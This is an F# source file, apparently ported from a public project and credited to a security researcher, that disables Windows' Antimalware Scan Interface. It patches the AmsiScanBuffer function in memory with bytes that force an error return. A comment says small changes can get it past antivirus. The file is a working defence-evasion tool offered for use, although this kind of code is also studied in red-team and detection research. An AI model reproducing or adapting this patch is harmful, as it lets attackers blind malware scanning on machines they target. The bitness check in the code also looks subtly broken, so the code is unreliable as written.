//  Ported from: https://github.com/rasta-mouse/AmsiScanBufferBypass
//  Written by: @JoeLeonJr from @FortyNorthSec 
//  for x33fcon
//  Note: the C# version of this gets picked up, so this one does as well. Small modifications can be made to bypass A/V.
  
open System
open System.Reflection
open System.Runtime.InteropServices

module Win32 =
    [<DllImport "kernel32" >]
    extern nativeint GetProcAddress(
      nativeint         hModule,
      string            procName)

    [<DllImport "kernel32" >]
    extern nativeint LoadLibrary(
        string         name)

    [<DllImport "kernel32" >]
    extern bool VirtualProtect(
          nativeint         lpAddress,
          uint32            dwsize, 
          uint32            flNewProtect, 
          uint32&         lpflOldProtect)

type Bypass() =
  class

    let amsix86 : byte[] = [|0xB8uy; 0x57uy; 0x00uy; 0x07uy; 0x80uy; 0xC2uy; 0x18uy; 0x00uy;|]
    let amsix64 : byte[] = [|0xB8uy; 0x57uy; 0x00uy; 0x07uy; 0x80uy; 0xC3uy;|]

    member this.is64Bits : bool = 
        let is64Bit : bool = true
        let size = Marshal.SizeOf((nativeint)0)
        if (size = 4) then is64Bit = false
        else is64Bit = true

    member this.Patch(patch : byte[], dll : string, func : string) =

         try
           let lib = Win32.LoadLibrary(dll)
           let addr : nativeint = Win32.GetProcAddress(lib, func)

           let mutable oldProtect : uint32 = Unchecked.defaultof<uint32>
           let vp = Win32.VirtualProtect(addr, (uint32)patch.Length, (uint32)0x40, &oldProtect)

           Marshal.Copy(patch, (int)0, addr, (int)patch.Length)

         with
           ex -> printfn "Error: %s" (ex.ToString())

    member this.BypassAmsi = 
        if this.is64Bits then this.Patch(amsix64, "amsi.dll", "AmsiScanBuffer")
        else this.Patch(amsix86, "amsi.dll", "AmsiScanBuffer")
        
  end

[<EntryPoint>]
let main argv =
    let b = new Bypass()
    b.BypassAmsi
    0 